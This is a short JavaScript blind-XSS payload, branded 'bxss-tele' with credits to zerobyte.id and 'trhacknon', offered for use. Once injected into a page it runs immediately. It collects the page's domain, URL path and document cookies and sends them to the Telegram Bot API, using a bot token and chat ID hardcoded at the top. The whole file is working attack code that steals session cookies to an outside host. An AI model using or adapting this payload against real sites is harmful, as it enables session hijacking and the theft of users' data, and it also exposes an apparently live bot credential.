var tokenBot = '5178207247:AAGmAoJX71KZQXrURaUXSrDacehVdsaRN6Y'; // Your "tokenBot" Here
var chatId = '-1001507256730'; // Your "chatId" Here

/*
	 _                     _       _      
	| |____  _____ ___    | |_ ___| | ___ 
	| '_ \ \/ / __/ __|___| __/ _ \ |/ _ \
	| |_) >  <\__ \__ \___| ||  __/ |  __/
	|_.__/_/\_\___/___/    \__\___|_|\___|
	------ Blind XSS Alert Telegram ------
	                           zerobyte.id
*/

function telegramSend(tokenBot, chatId) {
	var textData = '<b>XSS+by+trhacknon+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
    xhr.send();
}
telegramSend(tokenBot, chatId)
